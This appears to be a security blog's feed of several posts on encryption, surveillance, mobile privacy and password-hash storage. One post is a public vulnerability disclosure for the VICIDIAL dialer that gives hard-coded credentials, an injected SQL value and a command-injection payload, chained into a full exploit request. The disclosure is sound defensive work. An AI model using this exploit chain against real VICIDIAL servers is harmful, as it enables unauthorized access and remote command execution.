      <description><p>Opportunistic encryption has become quite a hot topic recently, and blew up in a big way thanks to an <a href="https://en.wikipedia.org/wiki/Internet_Draft">Internet Draft</a> that was published on February 14th for what amounts to sanctioned man-in-the-middle. Privacy advocates were quickly up in arms - but it&#8217;s not that simple (<a href="http://tools.ietf.org/html/draft-loreto-httpbis-trusted-proxy20-01">see here</a>). As <a href="http://hillbrad.typepad.com/blog/2014/02/trusted-proxies-and-privacy-wolves.html">pointed out</a> by <a href="https://twitter.com/hillbrad">Brad Hill</a>, this isn&#8217;t about HTTP<strong>S</strong> traffic, but HTTP traffic using unauthenticated TLS; thanks to poor wording in the document, it&#8217;s easy to miss that fact if you just skim it.</p>

<p>It&#8217;s routine practice for ISPs to MITM unencrypted traffic today; it&#8217;s well known that <a href="https://blog.ryankearney.com/2013/01/comcast-caught-intercepting-and-altering-your-web-traffic/">Comcast does it</a>. This practice won&#8217;t change once we move to HTTP2, regardless of unauthenticated TLS - the only question is will users know about it.</p>

<p>But this isn&#8217;t about that single internet draft, it&#8217;s about what this tells us about opportunistic encryption.</p>

<p>We&#8217;ve seen many smart people get very upset (myself included) over a misunderstanding about how opportunistic encryption fits into the new HTTP2 paradigm. What does that tell us about how it&#8217;ll be perceived in the future?</p>

<p><strong>What does opportunistic encryption buy us?</strong></p>

<p>We can break attackers down into two classes:</p>

<ul>
<li>Active - Will intercept and re-route traffic, at small or large scale.</li>
<li>Passive - Will watch what goes over the wire, but is unable or unwilling to interfere with it.</li>
</ul>


<p>Opportunistic encryption prevents passive attackers from being able to collect data, they will either fail or be forced into an active role (if they are positioned and financed to do so). While many talk about increasing the cost of surveillance for groups like the NSA, I doubt that will create a substantial impact - we know that they are both active and passive today. So they are positioned for active attacks when they so desire, though there may be some reduction of monitoring lower value targets due to increased complexity / resource demands.</p>

<p><strong>What opportunistic encryption doesn&#8217;t do</strong></p>

<p>Unauthenticated TLS skips the most vital step in the process - it doesn&#8217;t verify that the server is actually the one you intend to talk to, meaning anyone that can control network traffic between you and the end server, can pretend to be the end server, monitoring all traffic. Which is, exactly what we have today with HTTP traffic.</p>

<p>So, you know your traffic is encrypted, what you don&#8217;t know is who has the keys, or how many people have seen the traffic. You&#8217;re safe from passive threats, but it provides no protection against active threats - but it&#8217;s also not intended to.</p>

<p><strong>Should we pursue it?</strong></p>

<p>If people weren&#8217;t involved - it eliminates a class of attacks without substantial costs, and forces passive attackers to become active. Overall, that sounds like a win, but there&#8217;s a problem: people.</p>

<p>Opportunistic encryption isn&#8217;t real security, it doesn&#8217;t stand up to active attackers - it provides protection against only a specific type of attack. Real TLS provides protection against both active and passive threats. If people understood this, opportunistic encryption would be fine - but people don&#8217;t understand that, that&#8217;s clear.</p>

<p>If people see it as a &#8220;just works&#8221; alternative to real TLS, then the harm it does greatly outweighs the value it provides. It will give a false sense of security, when in reality there is none.</p>

      <title>VICIDIAL: Multiple Vulnerabilities</title>
      <description><p><em>Update:</em> The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I&#8217;ve pointed out here. Please make sure you are using the latest version available. If you aren&#8217;t sure if your instance is safe, contact your friendly local penetration tester to verify it&#8217;s secure as you expect it to be.</p>

<p><em>Update:</em> The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468.</p>

<h2>Background</h2>

<p><a href="http://www.vicidial.org/vicidial.php">VICIDIAL</a> (a.k.a. Asterisk GUI client) is an open-source dialer built on top of the Asterisk PBX. It&#8217;s written in PHP, and has a significant number of security issues.</p>

<p>In addition to the open-source project, the company behind VICIDIAL, <a href="http://www.vicidial.com/">The Vicidial Group</a>, also offers VICIDIAL in a hosted environment.</p>

<p>At this time, the current release version <strong>is still vulnerable</strong>. Vendor reports hosted users are on a fixed version. Vendor proposed to release the OSS code in mid-July, as of October 23rd, no update or advisory has been released.</p>

<p>After discussions with other researchers, I have made the decision that after waiting more than 140 days for a release, patches, or an advisory warning users, that the next responsible step is to disclose the issue publicly.</p>

<p>This is not a decision I take lightly, but I believe at this point users of this application should understand the degree of risk involved, and have details so they can take action to minimize that risk.</p>

<h2>Overview</h2>

<p>Tested versions: 2.7RC1, 2.7, 2.8-403a; it is likely other versions are affected.</p>

<p>There are three vulnerabilities that I will discuss here:</p>

<ol>
<li>Pre-Auth SQL Injection in <code>./apc/SCRIPT_multirecording_AJAX.php</code></li>
<li>Hard-Coded User Credentials</li>
<li>Command Injection in <code>./agc/manager_send.php</code></li>
</ol>


<p>There are pre and/or post authentication SQL injection flaws in nearly every file in the <code>./agc</code> directory. The web portion is split between <code>./agc</code> (which is the &#8216;agent&#8217; interface) and <code>./vicidial</code> (the administrative interface). My review did not include the <code>./vicidial</code> directory, though a quick glance indicates that there are likely many issues there as well.</p>

<p>There are many other issues; from XSS to a possible DoS by allowing an attacker to write directly to a log file until the attacker has exhausted the free space on the server.</p>

<p>There&#8217;s also <code>./vicidial_mysql_errors.txt</code> - it might be of interest as it contains query parameters.</p>

<p>I will not document all of the issues that I&#8217;ve found; partly because I don&#8217;t want to take the time, and also because I feel bad for the team at OSVDB - hundreds of entries for the same application wouldn&#8217;t be fun.</p>

<h2>Pre-Auth SQL Injection</h2>

<p>This is your typical, boring, SQL injection:</p>

<figure class='code'><figcaption><span>SCRIPT_multirecording_AJAX.php - Line 44 </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="nv">$stmt</span><span class="o">=</span><span class="s2">&quot;select campaign_rec_filename from vicidial_campaigns where campaign_id=&#39;</span><span class="si">$campaign</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>$campaign</code> variable is unsanitized and passed directly to the query. This isn&#8217;t the best SQL Injection ever, but it demonstrates the issue.</p>

<h2>Hard-Coded User Credentials</h2>

<p>There are two accounts that are created when you install VICIDIAL that have hard coded passwords, that are used by the software. While these accounts have minimal permissions, they do allow an attacker to get to portions of the code not accessible without a valid user account.</p>

<p>Accounts:</p>

<ul>
<li>VDAD</li>
<li>VDCL</li>
</ul>


<p>Both accounts have the same password: <code>donotedit</code>.</p>

<h2>Command Injection</h2>

<p>In multiple locations, there are calls to <code>passthru()</code> that do not perform any filtering or sanitization on the input. In this case, we are looking at <code>./agc/manager_send.php</code> line 429.</p>

<p>Here is the code in question:</p>

<figure class='code'><figcaption><span>manager_send.php </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>To exploit this, the following values must be set:</p>

<ul>
<li><code>enable_sipsak_messages=1</code></li>
<li><code>allow_sipsak_messages=1</code></li>
<li><code>protocol=sip</code></li>
<li><code>ACTION=OriginateVDRelogin</code></li>
<li><code>session_name=AAAAAAAAAAAA</code> (or any other value at least 12 bytes long)</li>
<li><code>server_ip=' OR '1' = '1</code></li>
<li><code>user=VDCL</code></li>
<li><code>pass=donotedit</code></li>
</ul>


<p>The payload is passed in the <code>extension</code> parameter, for my testing, I used the following:</p>

<p><code>extension=;id;uname -a;</code></p>

<p>As you&#8217;ve probably noticed, the value for <code>server_ip</code> isn&#8217;t just a dummy value, it&#8217;s taking advantage of a SQL Injection vulnerability on line 285:</p>

<figure class='code'><figcaption><span>manager_send.php </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="nv">$stmt</span><span class="o">=</span><span class="s2">&quot;SELECT count(*) from web_client_sessions where session_name=&#39;</span><span class="si">$session_name</span><span class="s2">&#39; and server_ip=&#39;</span><span class="si">$server_ip</span><span class="s2">&#39;;&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This allows us to bypass the check for an active session, and we use the hard coded credentials to get around the need for authentication.</p>

<p>When you execute this, it looks like this:</p>

<pre><code>GET http://192.168.10.131/agc/manager_send.php?enable_sipsak_messages=1&amp;allow_sipsak_messages=1&amp;protocol=sip&amp;ACTION=OriginateVDRelogin&amp;session_name=AAAAAAAAAAAA&amp;server_ip=%27%20OR%20%271%27%20%3D%20%271&amp;extension=%3Bid%3Buname%20-a%3B&amp;user=VDCL&amp;pass=donotedit HTTP/1.1

      <title>Worried about the NSA? Try AES-512!</title>
      <description><p><em>[…or, The Cost of Wild Speculation]</em></p>

<p>&#8220;We need to boost our security - I think the NSA has broken everything we use. AES-256 is too weak, I don&#8217;t trust it. Find a way to implement AES-512.&#8221;</p>

<p>Double-AES-256! It&#8217;d be easy, and double encrypting has <a href="https://en.wikipedia.org/wiki/Meet-in-the-middle_attack">never bitten us</a> before. So, let&#8217;s write some code!</p>

<p>This (somewhat) hypothetical conversation is becoming more common in the face of uncertainty and wild speculation. We have seen a glimpse into the greatest adversary that cryptography has. And we&#8217;ve learned almost nothing.</p>

<p>We know they have attacks, but we don&#8217;t know against what. Is Diffie-Hellman broken? Is ECC backdoored? Has the <a href="https://en.wikipedia.org/wiki/RSA_problem">RSA problem</a> been solved? Or maybe they&#8217;ve only found a somewhat more efficient way to factor  RSA keys? I&#8217;ve also heard speculation that they&#8217;ve broken RC4. They might have backdoors in OpenSSL or Microsoft&#8217;s CAPI.</p>

<p>We have no idea.</p>

<p>Here&#8217;s what we do know, in the past, uncertainty and speculation drove adoption of snake-oil solutions. Flawed, nonsensical technologies that just did more harm than good. Speculation today risks driving people from something that&#8217;s safe, to tools that leave them fully exposed.</p>

<p>It&#8217;s hard to give pragmatic advice in the face such uncertainty; but we must be cautious, we must not panic. I won&#8217;t accuse anyone of over-reacting, as what we have seen is startling to say the least - but there are bigger risks to consider.</p>

<p>For example, let&#8217;s assume for just a moment that the NSA has, in fact, influenced the ECC specification to include curves with weaknesses known to itself. What are the risks?</p>

<ol>
<li>The NSA is able to decrypt messages at will.</li>
<li>A well equipped adversary (say, another state funded group) could discover the flaw, and exploit it.</li>
</ol>


<p>Neither of those give me warm-fuzzies, but there are worse things: in the panic over &#8220;OMG - ECC is broken&#8221; people hastily switch to magic solutions that rely on obscurity and have no proven security, or to hastily implemented, poorly configured solutions that make them vulnerable to not only nation-state level adversaries, but much smaller ones as well.</p>

<p>If in the panic over ECC one was to move to an RSA based system with weak keys - they are likely to be far more vulnerable than they would have been, had they done nothing at all.</p>

<p>This of course applies to many scenarios, not just ECC - and personally, I trust ECC over RSA, at lease when using <a href="http://cr.yp.to/ecdh.html">curve25519</a> or other non-NSA supplied curves.</p>

<p>There are no good answers to be found right now; all we can do is exercise caution and try to keep people from over-reacting and making their problems worse.</p>

<p><em>[N.B. I realize that meet-in-the-middle isn&#8217;t practical against AES-256 with technology as we know it, but it had to be pointed out. Also, please, <strong>please</strong> don&#8217;t use the double AES-256 / AES-512 code. Really. Just don&#8217;t.]</em></p>

      <title>Crypto, the NSA, and Broken Trust</title>
      <description><p>Even as a child I was fascinated by cryptography - and often left the local librarians with puzzled looks thanks to the books I would check out. It&#8217;s so elegantly simple, and yet massively complex. There is one very unusual property of crypto though - it&#8217;s not about math or modes, it&#8217;s about trust.</p>

<p>Cryptography, especially as used today, has the most wonderful dichotomy of trust; on one hand crypto, by it&#8217;s very nature, is used in situations lacking trust. On the other hand, to use crypto - you have to trust <em>it</em>.</p>

<p><strong>But what is <em>it</em>?</strong></p>

<p>This is where it gets interesting - let&#8217;s say you download <a href="https://gpgtools.org/">GPGTools</a>, what is the chain of trust?</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Has anyone verified that the GPGtools binaries match the source code in the git repo? Im suspicious of any binary distro encryption software</p>&mdash; the grugq  (@thegrugq) <a href="https://twitter.com/thegrugq/statuses/376323020945514497">September 7, 2013</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Here are some of the assumptions you make:</p>

<ul>
<li>The installer hasn&#8217;t been tampered with by your ISP, their upstream providers, GPGTools&#8217; hosting company - all of this is before you even get to the people that publish the software! (And <a href="http://projects.wsj.com/surveillance-catalog/documents/267850-merged-finfly-isp/">we know</a> this is being done.)</li>
<li>The computer that built the binaries was free of malware, or other backdoors.</li>
<li>The source code hadn&#8217;t been modified, without the knowledge of the developers.</li>
<li>The developers haven&#8217;t modified the code to add backdoors or otherwise weaken it.</li>
<li>The compiler, and other libraries are free of backdoors or other modifications that would alter the resulting binaries.</li>
</ul>


<p>I could keep going, there&#8217;s more - but this gives an idea of how many things you have to trust, not just for every application - but every update of every application.</p>

<p>You could compile everything yourself of course (if its&#8217; open source that is) - but that only eliminates some of these issues. You still have to trust the code, you still have to trust the developers.</p>

<p>Well, you could audit the code. If you know what you&#8217;re doing - in a few weeks you might actually get to the point of installing it. Which of course there will be a new update by then.</p>

<p><strong>Can&#8217;t we fix this?</strong></p>

<p>Some of it, yes - maybe. The Tor project is working on <a href="https://blog.torproject.org/blog/deterministic-builds-part-one-cyberwar-and-global-compromise">deterministic builds</a>, which would allow others to verify that the released binary was built from a specific revision of the source code. This is really quite impressive, and something I truly applaud them for.</p>

<p>But, that doesn&#8217;t lessen the trust you place in the developers and the code - is it actually secure? Are the even competent to be doing this work? Are there bugs in the PRNG or key negotiation that could render the system pointless? There&#8217;s still a level of trust required.</p>

<p><strong>What about the standards?</strong></p>

<p>We know that the government has sought to backdoor or weaken systems in the past - from things like the <a href="https://en.wikipedia.org/wiki/Clipper_chip">Clipper chip</a>; enforcing illogical <a href="https://en.wikipedia.org/wiki/Export_of_cryptography_in_the_United_States">export restrictions</a>, and trying to enact laws that <a href="https://www.eff.org/deeplinks/2013/05/caleatwo">mandate backdoors</a> (CALEA II). Now, we know that after losing the Crypto Wars of the past, they have been clandestinely doing the <a href="http://www.theguardian.com/world/2013/sep/05/nsa-gchq-encryption-codes-security">same things</a>.</p>

<p>The single biggest things that you have to trust are the protocols and algorithms - they are the most complicated, and only a very small number of people are qualified to audit them. If the protocol has deliberate flaws, or there is a backdoor in the algorithm - then your efforts to encrypt may be for nothing.</p>

<p><strong>It&#8217;s all about trust</strong></p>

<p>I&#8217;m a big fan of taking the &#8220;trust no one&#8221; position (and myself least of all), but in the world of cryptography - it&#8217;s not that easy. Every step of the way you have to trust something.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p><a href="https://twitter.com/gentmatt">@gentmatt</a> way to miss the point. &quot;Trust, but verify&quot;. The time for verification has come.</p>&mdash; the grugq  (@thegrugq) <a href="https://twitter.com/thegrugq/statuses/376328406419243008">September 7, 2013</a></blockquote>

<p>Some say, &#8220;trust but verify&#8221; - and I agree, but full verification is a dream that will never come true. There aren&#8217;t enough qualified eyes, and there is far too much code involved.</p>

<p>With so many dependencies, so many places something malicious could be injected - it&#8217;s almost overwhelming to think about. In my eyes though, the first, and most important step, is helping people to understand the chain of trust. If you understand what you are trusting, you can ask better questions.</p>

<p>There is no real answer here - this is simply how it is. If you use cryptography (and you aren&#8217;t a true cryptographer), then you&#8217;re taking a leap of faith. If you didn&#8217;t compile all of the tools you use - it&#8217;s an even bigger leap.</p>

<p><em>[N.B. This article was planned before the <a href="http://www.theguardian.com/world/2013/sep/05/nsa-gchq-encryption-codes-security">Bullrun</a> story broke; but in light of these recent events, I&#8217;ve updated and published this ahead of schedule.]</em></p>

      <title>Making Android NSA-Proof</title>
      <description><p>As it turns out, it&#8217;s quite easy to make your Android phone NSA-proof. It&#8217;s a simple method, and anyone can do it - all you need is a few ounces of thermite!</p>

<p><a href="https://secure.flickr.com/photos/pkh/578831120/"><img class="center" src="https://farm2.staticflickr.com/1341/578831120_8ee93c49af.jpg"></a></p>

<p>Too extreme?</p>

<p>Let&#8217;s shoot for something a little more attainable - spy resistant. We can&#8217;t stop every attack, but we can reduce the attack surface a bit. Here are a few tools that I&#8217;ve been using recently to do just that.</p>

<p><strong><a href="https://www.boxcryptor.com/en/boxcryptor-classic">Boxcryptor Classic</a></strong> - Like many people, I use DropBox for certain, low sensitivity files. But what about things that require a little more care? Boxcryptor Classic encrypts files and then stores the encrypted copy in DropBox. It&#8217;s simple, security seems sound, and the free edition is quite adequate. May not be perfect, but suits my needs nicely.</p>

<p><strong><a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms">TextSecure</a></strong> - It&#8217;s <a href="https://github.com/WhisperSystems/TextSecure/">open-source</a>, it&#8217;s free, and it&#8217;s from <a href="https://twitter.com/moxie">Moxie</a> - what&#8217;s not to love? It stores all of your SMS &amp; MMS data encrypted, and can encrypt the data over the air when texting another TextSecure user.</p>

<p>Currently it uses the SMS/MMS service for messaging, and is Android only; both of those things are changing soon. It&#8217;ll be using the <a href="https://whispersystems.org/blog/asynchronous-security/">data channel</a> and supporting <a href="https://whispersystems.org/blog/iphone-rsn/">iOS</a> in the near future.</p>

<p><strong><a href="https://play.google.com/store/apps/details?id=com.kaitenmail&amp;hl=en">Kaiten Mail</a> &amp; <a href="https://play.google.com/store/apps/details?id=org.thialfihar.android.apg&amp;hl=en">AGP</a></strong> - Kaiten is a low cost ($4.99) mail client; though if you want to go cheaper, it&#8217;s open-source cousin <a href="https://play.google.com/store/apps/details?id=com.fsck.k9&amp;hl=en">K-9 Mail</a> is free. They are developed by the same core team, though Kaiten seems to get the new features first, then they are ported into K-9. I like supporting OSS developers, so I happily went with the paid version. It works great with my Google Apps email account, though does take some getting used to.</p>

<p>Where it really comes in handy though, is when you use it with AGP, the Android Privacy Guard. It&#8217;s a simple, minimalistic OpenPGP tool that integrates nicely with Kaiten and K-9. It makes it simple to support encrypted or signed mail on your phone.</p>

<p>This does though require that your private key be on the device, so keep that risk in mind.</p>

<p>AGP is a bit dated, and hasn&#8217;t been updated since 2010. So, it&#8217;s  clearly been abandoned. Thankfully though, <a href="http://sufficientlysecure.org/">Dominik Schürmann</a> has <a href="https://github.com/dschuermann/openpgp-keychain">forked the project</a> and is working on a major update (new GUI, new API, etc.) that should be ready early next year.</p>

<p><strong><a href="https://play.google.com/store/apps/details?id=com.gmail.mjm4456.vpncilla&amp;hl=en">VpnCilla</a></strong> - Next up is a highly configurable VPN client ($4.99). WIFI is great - except that evil part of your traffic being so simple to monitor, and with recent work on <a href="http://www.theregister.co.uk/2013/07/15/femtocell_flaw_leaves_verizon_customers_wifi_and_mobile_wide_open/">femtocell systems</a>, even 3G/4G connections can&#8217;t be fully trusted. Having a VPN handy is a must.</p>

<p>You&#8217;ll also need a good VPN service; my current pick is <a href="http://www.atenlabs.com/zipline/">zipline</a>; it&#8217;s fast, cheap, and from a trusted professional (<a href="https://twitter.com/viss">Dan Tentler</a>).</p>

<p><strong><a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.redphone&amp;hl=en">RedPhone</a></strong> - Another tool from Moxie, RedPhone secures your voice communications via encrypted VoIP. Or at least so I&#8217;ve read - I never actually make voice calls on my personal phone anymore.</p>

<p><strong>Others</strong> - There are various other useful things - Google Authenticator (2FA all the things, right?), ConnectBot to SSH into your server to do anything you don&#8217;t want to do from your phone, use wifitrack &amp; Wifi Analyzer to better understand what&#8217;s in your area.</p>

<p><strong>Configuration</strong></p>

<p>There is, of course, obvious configuration to make things a bit safer. Make sure you have a good password, or at least a long PIN set - don&#8217;t trust patterns, and don&#8217;t bother with a 4 digit PIN.</p>

<p>USB debugging <em>must</em> be turned off - otherwise there&#8217;s no point in locking your phone. Some other settings help, but not enough - one big one is Android&#8217;s full disk encryption.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Hashkill now cracks Android FDE images master password. Speed is ~135k on 6870, ~270k/s on 7970. Android FDE is weak. <a href="http://t.co/mhcvEuEP48">pic.twitter.com/mhcvEuEP48</a></p>&mdash; gat3way (@gat3way) <a href="https://twitter.com/gat3way/statuses/328550698558029824">April 28, 2013</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>If you only have a short numeric PIN, the FDE is little better than a wet paper bag.</p>

<p><strong>Weak Spots</strong></p>

<p>It&#8217;s not all great though, there are still weaknesses - plenty in fact. Thanks to USB MUXing there is probably a debug interface - and maybe even a full shell on your phone, and you have no way of turning it off. There may be flaws in the baseband or other software that could allow an attacker to gain control.</p>

<p>The list goes on and on. And that&#8217;s without the fact that your phone company hands over all of your call records, or the various apps you need, but don&#8217;t have a secure replacement.</p>

<p>There is no such thing as an NSA proof phone - unless you literally melt it. What we can do though is make it harder to be spied on; make the attackers work for every bit of data. Give nothing away for free.</p>

      <title>Is moving offshore really crazy?</title>
      <description><p>Today ZDNet published an article titled &#8221;<a href="http://www.zdnet.com/the-lunacy-of-trying-to-avoid-nsa-spying-by-moving-e-mail-and-cloud-out-of-the-us-7000019908/">The lunacy of trying to avoid NSA spying by moving e-mail and cloud out of the US</a>&#8221; - I&#8217;m still trying to figure out if the position is naive, or intentionally ignores important facts.</p>

<p>In short, the author (<a href="http://www.zdnet.com/meet-the-team/us/steven-j-vaughan-nichols/">Steven J. Vaughan-Nichols</a>) states that your data is safer in the US because outside of the US, the NSA has much less restrictive rules to operate under. This is actually true - the NSA is a spy agency; like most spy agencies, they spy on people.</p>

<p>For those outside of the US, or those that routinely communicate  with those that are outside of the US - as far as the NSA goes, you are fair game. Anything and everything you do, if they can see it, they&#8217;ll use. So on that point, ZDNet was right.</p>

<p>But their points only hold true if you ignore cryptography.</p>

<p>When your data is outside the US, you have to rely on encryption to protect your data; inside the US you have to rely on <a href="https://epic.org/privacy/terrorism/fisa/fisc.html">FISC</a> to protect you. The <a href="http://arstechnica.com/tech-policy/2013/08/how-might-the-feds-have-snooped-on-lavabit/">Lavabit affair</a> (or Hushmail if you want another example) should make it clear that inside the US, encrypted data held by a third-party shouldn&#8217;t be seen as secure as it once was - for that matter, it probably shouldn&#8217;t be viewed as secure at all (if your adversary is the US Government; in which case, you don&#8217;t have much hope anyway).</p>

<p>When somebody posted a link to the article, I made my point short and sweet:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p><a href="https://twitter.com/gattaca">@gattaca</a> It&#39;s a lot harder to break crypto than it is to order a provider to just hand over the data. With good crypto, offshore is safer.</p>&mdash; Adam Caudill (@adamcaudill) <a href="https://twitter.com/adamcaudill/statuses/372469441922998272">August 27, 2013</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>It&#8217;s hard to break properly implemented, strong cryptography - on the other hand, getting FISC to order a provider to hand over your data seems to be <a href="https://www.eff.org/deeplinks/2013/08/nsa-spying-three-pillars-government-trust-have-fallen">quite simple</a>. Given the choice of relying on encryption or a rubber-stamp court to protect my data - the right choice seems obvious.</p>

<p>Now, in all fairness, it&#8217;s worth noting that the NSA likes to collect and examine encrypted communication more than other things - and the odds of your data passing through the NSA is certainly higher if your data is offshore. If properly encrypted though, the odds of them seeing the content is reduced.</p>

<p>So is it insane to move data offshore to avoid the NSA? If you want them to not see anything you do, then yes, yes it is. If you want to reduce the odds of them seeing the content - it&#8217;s actually a reasonably prudent move.</p>

      <title>Hash Storage: Make Attackers Work</title>
      <description><p>So you hash your passwords? Good. Do you salt? That&#8217;s good. Do you use a strong hashing algorithm (PBKDF2/bcrypt/scrypt)? Great! But how do you store the hashes? What happens when you get hit with a SQL injection attack?</p>

<p>I&#8217;m a big believer in defense in depth - not that marketing garbage about staking layers of blinky-light boxes, but using techniques to add extra work for an attacker. You might not be able to stop every attack, but the more work they have to do, the better the odds they won&#8217;t get everything they want.</p>

<p>So, let me describe a scenario:</p>

<p>$company stores passwords as <code>SHA1(password + salt)</code> hashes (terrible, I know - but still common). They install a new web application that connects to their main database - this new application has a previously undisclosed flaw, SQL injection.</p>

<p>$evil_hacker finds this flaw and looks for companies that use the application; finds $company, exploits, dumps their user table and posts the hashes on PasteBin. Having both the hash and salt, those hashes will fall <em>quickly</em>.</p>

<p>We&#8217;ve all seen it before - far too many times.</p>

<p>Now, let me modify the scenario slightly: instead of <code>SHA1(password + salt)</code>, make it <code>AES128(salt : SHA1(password + salt), key)</code> - where <code>key</code> is an application secret.</p>

<p>Now, we have a different story - as long as the application secret remains secret, the hashes are safe. Stored in the clear, they will fall quickly - encrypted, they are safe as long as the secret remains safe.</p>

<p>In the case of many SQL injection attacks, the attacker is able to access the data, but doesn&#8217;t have access to the application source code. In these cases, you can add a few extra milliseconds to processing time and as a result stop attackers from using stolen data from a entire class of attacks. There&#8217;s nothing new about this idea - but I don&#8217;t see it used nearly often enough.</p>

<p>Obviously this doesn&#8217;t help if the attacker is able to retrieve the source code, so you still need to use a strong hashing algorithm. Encrypting a strong hash buys you extra protection against certain attacks, and maintains a strong baseline against  others - at a very small performance cost.</p>

<p>In case of a breach, I would still assume that the attacker knows the encryption key, and reset passwords accordingly. Seeing as it takes time to find out the extent of the breach, it&#8217;s safest to act as if the attacker has everything and limit the damage as quickly as possible. In reality though, the odds of the passwords being exposed as a result of a SQL injection attack is reduced significantly thanks to the added encryption layer.</p>

<p>Storing the data like this keeps everything secure, and in a single field (and makes it easy to integrate into existing applications):</p>

<p><code>&lt;IV&gt;:AES128(&lt;salt&gt;:HASH(&lt;password&gt;&lt;salt&gt;))</code></p>

<p>This way all of the material needed is encrypted; though it could be argued that just encrypting the hash or the salt would be sufficient (assuming the salt is at least 16 bytes and generated by a CSPRNG). The core idea here is to deny the attacker of as much information as possible; making it as difficult as possible to find passwords.</p>

<p>There are no <a href="http://adamcaudill.com/2013/05/07/password-hashing-no-silver-bullets/">silver bullets</a>, but we can take advantage of the tools we have to make attackers work harder to get our secrets.</p>

      <title>Cryptocat: What is the measure&#8230;</title>
      <description><p>What is the measure of a man; what makes one great, and another lesser? What separates success from failure? We all recognize light from dark, but at which point does it go from one to another? If we ask if a person (or company, or product) is successful - do we measure them against their closest competitor, their nearest neighbor, or perhaps the most successful person we know? Where, and how, do you set that bar to measure against?</p>

<p>Yesterday I talked to <a href="http://nadim.cc/">Nadim Kobeissi</a> for about an hour about Cryptocat, its policies, practices, successes, failures, and goals. The topic of goals led to an interesting discussion - to what standard is Cryptocat being held? Perhaps, just perhaps - the unforgivable security failures of Cryptocat are only so unforgivable because of the bar it&#8217;s being measured against.</p>

<blockquote><p>[this] is a crucible; in it we burn away irrelevancies until we are left with a pure product: the truth, for all time.</p></blockquote>


<p>So, what it the true goal? Here is a snippet of their <a href="https://github.com/cryptocat/cryptocat/blob/master/README.md">readme</a>, which (kinda) lays out the goal:</p>

<pre><code>Cryptocat is an experimental browser-based chat client for easy to use, encrypted conversations. 
It aims to make encrypted, private chat easy to use and accessible. We want to break down the 
barrier that prevents the general public from having an accessible privacy alternative that 
they already know how to use. Cryptocat is currently available for Chrome, Firefox and Safari.
</code></pre>

<p>The second sentence is the one that I find interesting, in light of the conversation I had yesterday; primarily this part: <em>an accessible privacy alternative that they already know how to use</em>. I asked Nadim at one point what his goal was, he responded without hesitation: to provide a safer alternative to Facebook Chat, Google Talk, etc..</p>

<p>When I asked about Cryptocat&#8217;s reputation as a tool for activists, he was clearly agitated and made his position on the matter very clear. That isn&#8217;t the intention, and he acknowledged that it&#8217;s not safe for that use. He then pointed me to a <a href="https://blog.crypto.cat/2012/11/security-update-a-follow-up/">quote on their blog</a>:</p>

<blockquote><p>We have realized that due to some (perhaps well-meaning) media coverage of the Cryptocat Project, our work has been labeled by the media as something that can aid activists in overthrowing governments or help save someone’s life. This is not what Cryptocat is, it is wrong for the media to say that, and we have never said anything to that effect ourselves.</p></blockquote>


<p>Though I will note, the initial feeling seemed to be a bit different:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Cryptocat featured in Wired! <a href="http://t.co/Aj45zedr">http://t.co/Aj45zedr</a></p>&mdash; Cryptocat (@cryptocatapp) <a href="https://twitter.com/cryptocatapp/statuses/228921660324061184">July 27, 2012</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p><strong>So, where does this leave us?</strong></p>

<p>The <a href="http://tobtu.com/decryptocat.php">most recent flaw</a> was bad, very, very bad. <em>If</em> you understand encryption, the protection afforded was far less than expected. Let&#8217;s look at it from another perspective though: Compared to Facebook Chat. While the bug was bad, how does it compare to other consumer chat systems, even with that flaw in mind? From what I&#8217;ve seen, it&#8217;s still a better option than Facebook.</p>

<p>First, let&#8217;s ignore encryption and just look at what we get from SSL/TLS:</p>

<p><a href="https://www.ssllabs.com/ssltest/analyze.html?d=facebook.com&amp;s=173.252.110.27">Facebook</a>:</p>

<p><img class="center" src="https://adamcaudill.com//files/Qualys_SSL_Labs_-_Projects___SSL_Server_Test___facebook.com.png"></p>

<p><a href="https://www.ssllabs.com/ssltest/analyze.html?d=crypto.cat">Cryptocat</a>:</p>

<p><img class="center" src="https://adamcaudill.com//files/Qualys_SSL_Labs_-_Projects___SSL_Server_Test___crypto.cat.png"></p>

<p>First thing that I can point out is the use of <a href="https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy">forward secrecy</a> - something Facebook isn&#8217;t using (<a href="http://news.cnet.com/8301-13578_3-57591179-38/data-meet-spies-the-unfinished-state-of-web-crypto/">yet</a>). So, if you just look at SSL/TLS, Cryptocat is better - assuming nobody else has access to the ciphertext, which <a href="https://blog.crypto.cat/2012/11/security-update-our-first-full-audit/">happened</a> (at least) when they used Cloudflare.</p>

